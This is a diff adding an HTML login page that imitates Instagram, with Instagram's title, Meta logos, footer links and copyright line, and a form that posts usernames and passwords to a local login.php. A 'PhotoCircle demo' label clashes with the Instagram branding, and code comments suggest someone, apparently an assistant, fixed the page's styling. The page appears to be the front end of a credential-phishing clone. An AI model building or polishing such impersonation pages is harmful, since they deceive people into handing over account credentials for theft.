@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0; min-height: 100vh; color: #171717; background: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        .topbar { height: 102px; display: grid; place-items: center; border-bottom: 1px solid #dbdbdb; }
+        .brand-logo { width: 44px; height: 44px; object-fit: contain; display: block; margin: 0 auto; }
+        main { width: min(410px, calc(100% - 40px)); margin: 76px auto 68px; }
+        h1 { margin: 0 0 14px; font-size: 14px; font-weight: 500; }
+        /* FIXED: sr-only was missing, so labels were visible/broken */
+        .sr-only {
+            position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+            overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+        }
+        /* FIXED: Style the INPUT itself, not just the wrapper */
+        .field { position: relative; margin-bottom: 12px; }
+        .field input {
+            width: 100%; min-height: 46px; padding: 14px 12px;
+            border: 1px solid #dbdbdb; border-radius: 13px;
+            color: #262626; background: #fafafa; font-size: 14px; outline: none;
+        }
+        .field input::placeholder { color: #737373; }
+        /* FIXED: :focus-within replaces your manual .selected class */
+        .field:focus-within input { border-color: #287be0; background: #fff; box-shadow: 0 0 0 2px rgba(40,123,224,.15); }
+        .button {
+            min-height: 35px; display: grid; place-items: center; margin-top: 18px;
+            border-radius: 20px; font-size: 12px; border: none; width: 100%; cursor: pointer;
+            font-family: inherit;
+        }
+        .button-primary { color: white; background: #0095f6; font-weight: 600; }
+        .button-primary:hover { background: #1877f2; }
+        .forgot { margin: 18px 0 48px; font-size: 12px; text-align: center; }
+        .forgot a { color: #00376b; text-decoration: none; }
+        .button-secondary { margin-top: 0; color: #262626; background: #f3f4f5; }
+        .button-outline { margin-top: 10px; border: 1px solid #2871c8; color: #1d5eaa; background: #fff; }
+        .wordmark-logo { width: 150px; height: auto; object-fit: contain; display: block; margin: 20px auto 0; }
+        .footer-lower { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; padding: 20px; border-top: 1px solid #dbdbdb; gap: 12px; }
+        .footer-lower ul { list-style: none; padding: 0; margin: 0; display: flex; gap: 15px; flex-wrap: wrap; }
+        .footer-lower a { color: #8e8e8e; text-decoration: none; font-size: 12px; }
+        .footer-lower a:hover { text-decoration: underline; }
+        .copyright { font-size: 12px; color: #8e8e8e; }
+        @media (max-width: 768px) { .footer-lower { flex-direction: column; align-items: flex-start; } }
+        @media (max-width: 480px) { .footer-lower ul { flex-direction: column; align-items: flex-start; } }
+    </style>
+</head>
+<body>
+    <header class="topbar" aria-label="PhotoCircle demo">
+        <img src="image/logo.jpg" alt="PhotoCircle Logo" class="brand-logo">
+    </header>
+<main>
+
+        <form action="login.php" method="POST" autocomplete="off" id="loginForm">
+            <div class="field">
+                <label for="username" class="sr-only">Mobile number, username or email</label>
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required autofocus autocomplete="username">
+            </div>
+            <div class="field">
+                <label for="password" class="sr-only">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            
+            <button type="submit" class="button button-primary" id="loginBtn">Log in</button>
+            
+            <p class="forgot"><a href="#">Forgot password?</a></p>
+            
+            <div class="or-separator">
+                <div class="line"></div>
+                <div class="line"></div>
+            </div>
+            
+            <button type="button" class="button button-secondary"><i class="fab fa-facebook-square"></i> Log in with Facebook</button>
+            <button type="button" class="button button-outline">Create new account</button>
+        </form>
+
+
+    <img src="image/meta.jpg" alt="Meta Logo" class="wordmark-logo">
+</main>
+<footer class="ig-footer">
+    <div class="footer-lower">
+        <ul>
+            <li><a href="#">Meta</a></li><li><a href="#">About</a></li><li><a href="#">Blog</a></li>
+            <li><a href="#">Jobs</a></li><li><a href="#">Help</a></li><li><a href="#">API</a></li>
+            <li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li><li><a href="#">Locations</a></li>
+            <li><a href="#">Instagram Lite</a></li><li><a href="#">Meta AI</a></li><li><a href="#">Threads</a></li>
+            <li><a href="#">Contact Uploading &amp; Non-Users</a></li><li><a href="#">Meta Verified</a></li>
+        </ul>
+        <span class="copyright">© 2026 Instagram from Meta</span>
+    </div>
+</footer>
+<script src="script.js"></script>
+</body>
+</html>
